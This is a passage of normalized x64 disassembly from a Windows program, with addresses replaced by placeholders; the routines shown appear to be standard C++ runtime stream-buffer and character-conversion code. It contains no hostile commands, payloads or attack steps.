shl eax 0x8
or eax ecx
sub_1400388c0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_14003f768
mov edx [ rax + 0x4 ]
mov [ rbx ] edx
call sub_14003f730
mov edx 0x2
mov ecx 0x100
mov [ rbx + 0x4 ] eax
call sub_140041704
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
call sub_140041898
and [ rbx + 0x10 ] 0x0
mov [ rbx + 0x8 ] rax
call sub_140041898
mov rcx [ rbx + 0x8 ]
mov r8d 0x200
mov rdx rax
call sub_14003a8c0
mov [ rbx + 0x10 ] 0x1
jmp r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14003892c
mov [ rsp + 0x8 ] cx
sub rsp 0x28
mov ecx 0x1
lea r9 [ rsp + 0x40 ]
lea rdx [ rsp + 0x30 ]
mov r8d ecx
call [ GetStringTypeW@IAT ]
movsx edx [ rsp + 0x40 ]
neg eax
sbb ecx ecx
and ecx edx
movzx eax cx
add rsp 0x28
retn
sub_140038960
push rbx
sub rsp 0x20
mov rax rdx
mov rbx rdx
mov r9 r8
sub rax rcx
mov rdx rcx
mov ecx 0x1
sar rax 0x1
mov r8d eax
call [ GetStringTypeW@IAT ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_140038990
mov r9 [ rw-data ]
lea r8 [ rw-data ]
mov r10 rcx
mov [ rw-data ] r8
test r9 r9
je r-xdata
mov rdx [ rw-data ]
test rdx rdx
je r-xdata
mov rax [ r9 ]
movsxd rdx [ rax + 0x4 ]
mov [ rdx + r9 + 0x50 ] r8
mov r8 [ rw-data ]
mov rdx [ rw-data ]
test rdx rdx
je r-xdata
mov rax [ rdx ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rdx + 0x50 ] r8
mov r8 [ rw-data ]
mov rax r10
retn
mov rax [ rdx ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rdx + 0x50 ] r8
sub_1400389fc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
call sub_140004aa0
xor ecx ecx
lea rax [ rdi + 0x10 ]
lea r8 [ rdi + 0x18 ]
mov [ rdi + 0x20 ] rax
mov [ rdi + 0x90 ] cl
mov [ rdi + 0x8a ] cl
mov [ rdi + 0x28 ] r8
lea rax [ rdi + 0x30 ]
lea r11 [ r--data ]
mov [ rdi + 0x40 ] rax
mov [ rdi ] r11
lea rax [ rdi + 0x38 ]
mov [ rdi + 0x48 ] rax
lea rax [ rdi + 0x50 ]
mov [ rdi + 0x58 ] rax
lea rax [ rdi + 0x54 ]
mov [ rdi + 0x60 ] rax
mov [ r8 ] rcx
mov rax [ rdi + 0x48 ]
mov [ rax ] rcx
mov rax [ rdi + 0x60 ]
mov [ rax ] ecx
mov rax [ rdi + 0x20 ]
mov [ rax ] rcx
mov rax [ rdi + 0x40 ]
mov [ rax ] rcx
mov rax [ rdi + 0x58 ]
mov [ rax ] ecx
mov [ rdi + 0x98 ] rbx
mov eax [ rw-data ]
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x8c ] eax
mov [ rdi + 0x80 ] rcx
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_140038ae8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor ebx ebx
mov rdi rcx
cmp [ rcx + 0x98 ] rbx
je r-xdata
mov rsi [ rsp + 0x38 ]
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx ]
mov esi 0xffff
mov edx esi
call [ rax + 0x18 ]
cmp si ax
je r-xdata
mov rcx [ rdi + 0x98 ]
call sub_14003eec0
test eax eax
jns r-xdata
or ebx 0xffffffff
sub_140038b3c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov rbx [ rsp + 0x80 ]
mov rsi [ rsp + 0x98 ]
mov rax [ rsp + 0x88 ]
mov [ rbx ] r8
xor r15d r15d
mov [ rsi ] rax
cmp [ rbx ] r9
mov edi r15d
mov rbp r9
setne dil
mov r13 rdx
mov r14 rcx
cmp [ rbx ] r9
je r-xdata
mov eax edi
mov r12 [ rsp + 0x90 ]
mov rdx [ rbx ]
mov rcx [ rsi ]
lea rax [ r14 + 0x10 ]
mov r8 rbp
mov r9 r13
mov [ rsp + 0x20 ] rax
sub r8 [ rbx ]
call sub_1400385a4
mov r11d eax
cmp eax 0xfffffffe
je r-xdata
mov [ rbx ] rbp
cmp eax 0xffffffff
je r-xdata
mov eax 0x2
jmp r-xdata
test eax eax
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
cmp r11d 0xfffffffd
cmove r11d r15d
mov rax [ rsi ]
cmp [ rax ] r15w
jne r-xdata
cmp [ rsi ] r12
je r-xdata
jmp r-xdata
movsxd rax r11d
mov edi r15d
add [ rbx ] rax
add [ rsi ] 0x2
cmp [ rbx ] rbp
jne r-xdata
mov rcx [ rbx ]
call sub_14003f7f0
lea r11d [ rax + 0x1 ]
sub_140038c28
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
mov rsi [ rsp + 0xa0 ]
mov rdi [ rsp + 0xb8 ]
mov rax [ rsp + 0xa8 ]
mov [ rsi ] r8
xor ebx ebx
mov [ rdi ] rax
cmp [ rsi ] r9
mov r15 r9
mov r14 rdx
setne bl
mov r13 rcx
mov [ rsp + 0x20 ] rcx
cmp [ rsi ] r9
je r-xdata
mov eax ebx
mov r12 [ rsp + 0xb0 ]
mov rbp [ rdi ]
call sub_14003f6e0
mov r8 r14
movsxd rdx eax
mov rax r12
sub rax rbp
cmp rdx rax
mov rax [ rsi ]
movzx edx [ rax ]
jg r-xdata
mov r9 [ rsp + 0x20 ]
mov r13d [ r14 ]
lea rcx [ rsp + 0x28 ]
add r9 0x10
call sub_1400379dc
test eax eax
js r-xdata
lea r9 [ r13 + 0x10 ]
mov rcx rbp
call sub_1400379dc
test eax eax
js r-xdata
mov eax 0x2
jmp r-xdata
movsxd rbp eax
mov rax r12
sub rax [ rdi ]
cmp rax rbp
jl r-xdata
add [ rsi ] 0x2
cdqe
add [ rdi ] rax
jmp r-xdata
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x90 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ r14 ] r13d
mov rcx [ rdi ]
lea rdx [ rsp + 0x28 ]
mov r8 rbp
call sub_14003a8c0
add [ rsi ] 0x2
add [ rdi ] rbp
mov r13 [ rsp + 0x20 ]
xor ebx ebx
cmp [ rsi ] r15
je r-xdata
jmp r-xdata
cmp [ rdi ] r12
je r-xdata
sub_140038d54
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x30
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x28 ] rax
mov rsi [ rsp + 0x80 ]
mov r12 rdx
mov rbp r9
mov [ rsi ] r8
mov r13d [ rdx ]
lea r9 [ rcx + 0x10 ]
lea rcx [ rsp + 0x20 ]
xor edx edx
mov r8 r12
xor ebx ebx
call sub_1400379dc
test eax eax
jg r-xdata
sub rbp [ rsi ]
dec eax
movsxd rdi eax
cmp rbp rdi
jge r-xdata
mov ebx 0x2
jmp r-xdata
test eax eax
jle r-xdata
mov [ r12 ] r13d
mov ebx 0x1
jmp r-xdata
mov eax ebx
mov rcx [ rsp + 0x28 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x70 ]
add rsp 0x30
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsi ]
lea rdx [ rsp + 0x20 ]
mov r8 rdi
call sub_14003a8c0
add [ rsi ] rdi
sub_140038df8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x30
mov eax [ rdx ]
xor r13d r13d
mov rsi r9
mov rdi r8
mov r12 rcx
mov [ rsp + 0x60 ] eax
mov ebx r13d
cmp [ rsp + 0x70 ] r13
jbe r-xdata
mov rsi [ rsp + 0x68 ]
mov eax ebx
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
cmp rdi rsi
je r-xdata
lea rax [ r12 + 0x10 ]
mov r8 rsi
lea r9 [ rsp + 0x60 ]
lea rcx [ rsp + 0x58 ]
mov rdx rdi
sub r8 rdi
mov [ rsp + 0x20 ] rax
call sub_1400385a4
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
cmove eax r13d
cmp [ rsp + 0x58 ] r13w
jne r-xdata
cdqe
inc ebx
add rdi rax
movsxd rax ebx
cmp rax [ rsp + 0x70 ]
jb r-xdata
mov rcx rdi
call sub_14003f7f0
inc eax
sub_140038ed0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rax [ rcx + 0x40 ]
mov rbx rcx
mov rcx [ rax ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x38 ]
movzx edi ax
mov eax 0xffff
cmp ax di
je r-xdata
mov rdx [ rbx + 0x58 ]
movsxd r8 [ rdx ]
lea rdx [ rcx + r8 * 2 ]
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx ]
movzx edx di
mov rcx rbx
call [ rax + 0x20 ]
movzx eax di
movzx eax [ rcx ]
jmp r-xdata
sub_140038f30
mov rax rsp
push rdi
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rbp rdx
mov rdi rcx
xor esi esi
mov [ rsp + 0x80 ] esi
test rcx rcx
je r-xdata
mov eax 0x2
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
cmp [ rcx ] rsi
jne r-xdata
lea ecx [ rsi + 0x18 ]
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x80 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140002a30
lea rcx [ rsp + 0x28 ]
call sub_140002990
mov esi 0x1
and [ rbx + 0x8 ] 0x0
lea rax [ r--data ]
mov [ rbx ] rax
call sub_140037a98
mov [ rbx + 0x10 ] rax
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rdi ] rbx
test sil 0x1
je r-xdata
sub_140038fe8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x40 ]
movzx edi dx
mov rbx rcx
mov rdx [ rax ]
xor ecx ecx
mov esi 0xffff
test rdx rdx
je r-xdata
mov rdx [ rbx + 0x98 ]
test rdx rdx
je r-xdata
mov rax [ rbx + 0x20 ]
cmp [ rax ] rdx
jae r-xdata
movzx eax si
cmp si di
je r-xdata
cmp si di
je r-xdata
cmp [ rbx + 0x80 ] rcx
jne r-xdata
mov rax [ rbx + 0x58 ]
inc [ rax ]
mov rax [ rbx + 0x40 ]
add [ rax ] 0xfffffffffffffffe
cmp di si
je r-xdata
cmp [ rdx - 0x2 ] di
jne r-xdata
mov r8 [ rbx + 0x40 ]
lea rdx [ rbx + 0x88 ]
cmp [ r8 ] rdx
je r-xdata
movzx ecx di
call sub_1400422fc
cmp ax si
je r-xdata
movzx eax cx
jmp r-xdata
movzx ecx di
mov r9 [ rbx + 0x20 ]
mov [ rdx ] di
mov rax [ r9 ]
cmp rax rdx
je r-xdata
movzx eax di
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov [ r9 ] rdx
mov rax [ rbx + 0x40 ]
mov rcx rbx
sub rcx rdx
mov [ rax ] rdx
mov rax [ rbx + 0x58 ]
add rcx 0x8a
sar rcx 0x1
mov [ rax ] ecx
jmp r-xdata
mov [ rbx + 0x70 ] rax
mov rax [ rbx + 0x58 ]
movsxd rcx [ rax ]
mov rax [ r8 ]
lea rcx [ rax + rcx * 2 ]
mov [ rbx + 0x78 ] rcx
sub_1400390d8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rax [ rdx ]
mov rbx rcx
mov rcx rdx
mov rdi rdx
call [ rax + 0x8 ]
xor edx edx
test al al
je r-xdata
mov [ rbx + 0x80 ] rdi
lea rax [ rbx + 0x10 ]
lea rcx [ rbx + 0x18 ]
mov [ rbx + 0x20 ] rax
mov [ rbx + 0x28 ] rcx
lea rax [ rbx + 0x30 ]
mov [ rbx + 0x40 ] rax
lea rax [ rbx + 0x38 ]
mov [ rbx + 0x48 ] rax
lea rax [ rbx + 0x50 ]
mov [ rbx + 0x58 ] rax
lea rax [ rbx + 0x54 ]
mov [ rbx + 0x60 ] rax
mov [ rcx ] rdx
mov rax [ rbx + 0x48 ]
mov [ rax ] rdx
mov rax [ rbx + 0x60 ]
mov [ rax ] edx
mov rax [ rbx + 0x20 ]
mov [ rax ] rdx
mov rax [ rbx + 0x40 ]
mov [ rax ] rdx
mov rax [ rbx + 0x58 ]
mov [ rax ] edx
mov [ rbx + 0x80 ] rdx
jmp r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_140039168
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_14003825c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
jmp r-xdata
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
lea rcx [ rsp + 0x68 ]
call sub_14003828c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
cmp [ rcx + 0x24 ] bl
je r-xdata
test rbx rbx
jne r-xdata
test rbx rbx
jne r-xdata
call sub_140037e88
cmp rdi [ rax + 0x18 ]
jae r-xdata
test rsi rsi
je r-xdata
xor ebx ebx
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
jmp r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_140038f30
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003a7f8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
int3
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rcx rbx
call sub_140037db8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_1400392bc
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x98 ]
mov r9 r8
test rcx rcx
je r-xdata
xor eax eax
test rdx rdx
jne r-xdata
xor r8d r8d
test r8 r8
jne r-xdata
mov rdx [ rbx + 0x98 ]
mov [ rbx + 0x8a ] al
mov [ rbx + 0x90 ] 0x1
lea rax [ rbx + 0x10 ]
lea rcx [ rbx + 0x18 ]
mov [ rbx + 0x20 ] rax
mov [ rbx + 0x28 ] rcx
lea rax [ rbx + 0x30 ]
mov [ rbx + 0x40 ] rax
lea rax [ rbx + 0x38 ]
mov [ rbx + 0x48 ] rax
lea rax [ rbx + 0x50 ]
mov [ rbx + 0x58 ] rax
lea rax [ rbx + 0x54 ]
mov [ rbx + 0x60 ] rax
and [ rcx ] 0x0
mov rax [ rbx + 0x48 ]
and [ rax ] 0x0
mov rax [ rbx + 0x60 ]
and [ rax ] 0x0
mov rax [ rbx + 0x20 ]
and [ rax ] 0x0
mov rax [ rbx + 0x40 ]
and [ rax ] 0x0
mov rax [ rbx + 0x58 ]
and [ rax ] 0x0
mov [ rbx + 0x98 ] rdx
mov eax [ rw-data ]
and [ rbx + 0x80 ] 0x0
mov [ rbx + 0x8c ] eax
mov rax rbx
jmp r-xdata
lea r8d [ r9 + 0x4 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
add r9 r9
call sub_140042364
test eax eax
jne r-xdata
sub_1400393b8
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0x90
mov [ rbp + 0x1f ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4f ] rax
mov rbx rcx
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
cmp [ rbx + 0x98 ] 0x0
je r-xdata
mov rdx [ rax ]
mov rax [ rcx + 0x58 ]
movsxd rcx [ rax ]
lea rax [ rdx + rcx * 2 ]
cmp rdx rax
jae r-xdata
mov eax 0xffff
mov rdx [ rbx + 0x20 ]
lea rax [ rbx + 0x88 ]
cmp [ rdx ] rax
jne r-xdata
mov rax [ rbx + 0x58 ]
dec [ rax ]
mov rdx [ rbx + 0x40 ]
mov rax [ rdx ]
lea rcx [ rax + 0x2 ]
mov [ rdx ] rcx
movzx eax [ rax ]
jmp r-xdata
cmp [ rbx + 0x80 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x78 ]
mov rax [ rbx + 0x70 ]
mov [ rdx ] rax
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
sub rcx rcx
sar rcx 0x1
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
mov rcx [ rbp + 0x4f ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
mov [ rbp + 0x3f ] 0xf
and [ rbp + 0x37 ] 0x0
mov [ rbp + 0x27 ] 0x0
mov rcx [ rbx + 0x98 ]
call sub_140041e34
movzx r11d ax
mov eax 0xffff
cmp r11w ax
je r-xdata
cmp [ rbp + 0x3f ] 0x10
jb r-xdata
mov r8b al
mov edx 0x1
lea rcx [ rbp + 0x27 ]
call sub_14000a700
lea r9 [ rbp + 0x27 ]
cmp [ rbp + 0x3f ] 0x10
cmovae r9 [ rbp + 0x27 ]
lea r8 [ rbp + 0x27 ]
cmovae r8 [ rbp + 0x27 ]
mov rcx [ rbx + 0x80 ]
mov r10 [ rcx ]
add r9 [ rbp + 0x37 ]
lea rax [ rbp + 0x17 ]
mov [ rsp + 0x38 ] rax
lea rax [ rbp + 0x9 ]
mov [ rsp + 0x30 ] rax
lea rax [ rbp + 0x7 ]
mov [ rsp + 0x28 ] rax
lea rax [ rbp + 0xf ]
mov [ rsp + 0x20 ] rax
lea rdx [ rbx + 0x8c ]
call [ r10 + 0x20 ]
test eax eax
js r-xdata
movzx eax r11w
jmp r-xdata
mov rcx [ rbp + 0x27 ]
call j_sub_14003ad04
jmp r-xdata
cmp eax 0x1
jle r-xdata
lea rax [ rbp + 0x7 ]
lea rcx [ rbp + 0x27 ]
cmp [ rbp + 0x17 ] rax
jne r-xdata
cmp eax 0x3
jne r-xdata
mov rdx [ rbp + 0x27 ]
mov r8 [ rbp + 0x3f ]
cmp r8 0x10
cmovae rcx rdx
mov eax [ rbp + 0x37 ]
mov r9 [ rbp + 0xf ]
sub eax r9d
add eax ecx
movsxd rdi eax
test eax eax
jle r-xdata
lea rax [ rbp + 0x27 ]
cmp [ rbp + 0x3f ] 0x10
cmovae rax [ rbp + 0x27 ]
mov r8 [ rbp + 0xf ]
sub r8 rax
xor edx edx
call sub_140006110
jmp r-xdata
cmp [ rbp + 0x37 ] 0x2
jae r-xdata
movzx ebx [ rbp + 0x7 ]
cmp r8 0x10
jb r-xdata
dec rdi
movsx ecx [ rdi + r9 ]
mov rdx [ rbx + 0x98 ]
call sub_140042610
test rdi rdi
jle r-xdata
mov rcx [ rbx + 0x98 ]
call sub_140042670
cmp eax 0xffffffff
je r-xdata
lea r8 [ rbp + 0x27 ]
cmp [ rbp + 0x3f ] 0x10
cmovae r8 [ rbp + 0x27 ]
mov edx 0x2
mov r9d edx
lea rcx [ rbp + 0x7 ]
call sub_14003b740
movzx ebx [ rbp + 0x7 ]
cmp [ rbp + 0x3f ] 0x10
jb r-xdata
jmp r-xdata
movzx eax bx
jmp r-xdata
mov rcx rdx
mov r8 [ rbp + 0x3f ]
mov rdx [ rbp + 0x27 ]
mov r9 [ rbp + 0xf ]
jmp r-xdata
mov rcx [ rbp + 0x27 ]
jmp r-xdata
call j_sub_14003ad04
sub_140039634
mov rax rsp
push rbp
push rdi
push r13
mov rbp rsp
sub rsp 0x70
mov [ rbp - 0x38 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rbx rcx
cmp [ rcx + 0x80 ] 0x0
je r-xdata
mov al 0x1
cmp [ rcx + 0x8a ] 0x0
je r-xdata
mov rax [ rcx ]
mov edi 0xffff
mov edx edi
call [ rax + 0x18 ]
cmp di ax
jne r-xdata
mov [ rbp - 0x18 ] 0xf
and [ rbp - 0x20 ] 0x0
mov [ rbp - 0x30 ] 0x0
mov r13d 0x8
cmp r13b 0xfe
jbe r-xdata
xor al al
jmp r-xdata
mov r8 r13
xor edx edx
lea rcx [ rbp - 0x30 ]
call sub_14003d760
mov [ rbp - 0x20 ] r13
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x10
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x8 ] 0x0
lea rcx [ r--data ]
call sub_1400378ec
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop rdi
pop rbp
retn
mov [ rbx + 0x8a ] 0x0
dec eax
jne r-xdata
cmp [ rbx + 0x8a ] 0x0
je r-xdata
lea rcx [ rbp - 0x30 ]
cmp r10 0x10
cmovae rcx r9
mov r9 [ rbx + 0x98 ]
mov r8 rdi
mov edx 0x1
call sub_14003ec7c
cmp rdi rax
jne r-xdata
sub eax 0x2
je r-xdata
jmp r-xdata
cmp r10 0x10
jb r-xdata
test rdi rdi
jne r-xdata
cmp [ rbp - 0x18 ] 0x10
jb r-xdata
mov r10 [ rbp - 0x18 ]
mov r9 [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x10
jb r-xdata
jmp r-xdata
lea rax [ rbp - 0x30 ]
mov r9 [ rbp - 0x30 ]
mov r10 [ rbp - 0x18 ]
cmp r10 0x10
cmovae rax r9
mov rdi [ rbp - 0x40 ]
sub rdi rax
je r-xdata
mov rcx r9
lea rdx [ rbp - 0x30 ]
cmp r10 0x10
cmovae rdx r9
lea r8 [ rbp - 0x30 ]
cmovae r8 r9
mov rcx [ rbx + 0x80 ]
mov r10 [ rcx ]
mov rax [ rbp - 0x20 ]
lea r9 [ rdx + rax ]
lea rax [ rbp - 0x40 ]
mov [ rsp + 0x20 ] rax
lea rdx [ rbx + 0x8c ]
call [ r10 + 0x30 ]
test eax eax
je r-xdata
xor r8d r8d
mov rdx r13
lea rcx [ rbp - 0x30 ]
call sub_14000a700
jmp r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
jmp r-xdata
mov rcx [ rbp - 0x30 ]
jmp r-xdata
mov r9 [ rbp - 0x30 ]
mov r10 [ rbp - 0x18 ]
call j_sub_14003ad04
sub_140039808
mov rax rsp
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rax - 0x5f ]
sub rsp 0x90
mov [ rbp - 0x1 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2f ] rax
movzx esi dx
mov rbx rcx
mov edi 0xffff
xor r12d r12d
cmp di dx
jne r-xdata
mov rdx [ rcx + 0x48 ]
cmp [ rdx ] r12
je r-xdata
movzx eax r12w
jmp r-xdata
cmp [ rbx + 0x98 ] r12
je r-xdata
mov rdx [ rdx ]
mov r8 [ rcx + 0x60 ]
movsxd rax [ r8 ]
lea rcx [ rdx + rax * 2 ]
cmp rdx rcx
jae r-xdata
mov rcx [ rbp + 0x2f ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
movzx eax di
mov rdx [ rbx + 0x20 ]
lea rax [ rbx + 0x88 ]
cmp [ rdx ] rax
jne r-xdata
dec [ r8 ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] si
cmp [ rbx + 0x80 ] r12
jne r-xdata
mov rcx [ rbx + 0x78 ]
mov rax [ rbx + 0x70 ]
mov [ rdx ] rax
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
sub rcx rcx
sar rcx 0x1
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
mov [ rbp - 0x19 ] si
mov [ rbp + 0x1f ] 0xf
mov [ rbp + 0x17 ] r12
mov [ rbp + 0x7 ] r12b
mov r13d 0x8
cmp r13b 0xfe
jbe r-xdata
mov rdx [ rbx + 0x98 ]
movzx ecx si
call sub_140042090
cmp ax di
je r-xdata
mov r8 r13
xor edx edx
lea rcx [ rbp + 0x7 ]
call sub_14003d760
mov [ rbp + 0x17 ] r13
lea rax [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x10
cmovae rax [ rbp + 0x7 ]
mov [ rax + 0x8 ] r12b
lea rcx [ r--data ]
call sub_1400378ec
movzx edi si
jmp r-xdata
cmp [ rbp + 0x1f ] 0x10
jb r-xdata
cmp eax 0x1
jg r-xdata
mov rcx [ rbp + 0x7 ]
cmp eax 0x3
jne r-xdata
lea rax [ rbp + 0x7 ]
mov r9 [ rbp + 0x7 ]
mov r10 [ rbp + 0x1f ]
cmp r10 0x10
cmovae rax r9
mov r13 [ rbp - 0x9 ]
sub r13 rax
je r-xdata
mov rdx [ rbx + 0x98 ]
movzx ecx [ rbp - 0x19 ]
call sub_140042090
cmp ax di
jne r-xdata
mov [ rbx + 0x8a ] 0x1
lea rax [ rbp - 0x19 ]
cmp [ rbp - 0x11 ] rax
jne r-xdata
lea rcx [ rbp + 0x7 ]
cmp r10 0x10
cmovae rcx r9
mov r9 [ rbx + 0x98 ]
mov r8 r13
mov edx 0x1
call sub_14003ec7c
cmp r13 rax
jne r-xdata
cmp [ rbp + 0x1f ] 0x10
jb r-xdata
mov esi edi
cmp r10 0x10
jb r-xdata
test r13 r13
jne r-xdata
jmp r-xdata
mov r10 [ rbp + 0x1f ]
mov r9 [ rbp + 0x7 ]
movzx eax si
jmp r-xdata
mov rcx [ rbp + 0x7 ]
jmp r-xdata
mov rcx r9
lea rdx [ rbp + 0x7 ]
cmp r10 0x10
cmovae rdx r9
lea r8 [ rbp + 0x7 ]
cmovae r8 r9
mov rcx [ rbx + 0x80 ]
mov r10 [ rcx ]
add rdx [ rbp + 0x17 ]
lea rax [ rbp - 0x9 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rdx
mov [ rsp + 0x28 ] r8
lea rax [ rbp - 0x11 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rbp - 0x17 ]
lea r8 [ rbp - 0x19 ]
lea rdx [ rbx + 0x8c ]
call [ r10 + 0x28 ]
test eax eax
js r-xdata
cmp [ rbp + 0x17 ] 0x20
jae r-xdata
call j_sub_14003ad04
jmp r-xdata
cmp r10 0x10
jb r-xdata
xor r8d r8d
lea edx [ r13 + 0x8 ]
lea rcx [ rbp + 0x7 ]
call sub_14000a700
jmp r-xdata
mov rcx r9
jmp r-xdata
mov r9 [ rbp + 0x7 ]
mov r10 [ rbp + 0x1f ]
call j_sub_14003ad04
sub_140039abc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov rax [ rcx + 0x40 ]
lea r12 [ rcx + 0x88 ]
mov ebp r9d
mov rsi r8
mov rbx rdx
mov rdi rcx
cmp [ rax ] r12
jne r-xdata
cmp [ rcx + 0x98 ] 0x0
je r-xdata
cmp r9d 0x1
jne r-xdata
mov rax [ r--data ]
and [ rbx + 0x8 ] 0x0
and [ rbx + 0x10 ] 0x0
mov [ rbx ] rax
